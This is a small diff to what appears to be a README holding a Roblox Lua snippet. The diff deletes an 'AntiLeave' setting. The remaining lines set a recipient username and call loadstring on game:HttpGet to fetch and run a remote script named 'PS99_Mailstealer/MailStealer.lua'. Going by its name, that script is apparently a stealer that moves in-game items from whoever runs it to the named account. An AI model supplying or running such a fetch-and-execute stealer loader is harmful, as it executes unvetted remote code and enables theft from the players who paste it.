@@ -2,7 +2,6 @@
 
 ```lua
 Username = "Your User Here"
-AntiLeave = true
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
 ```
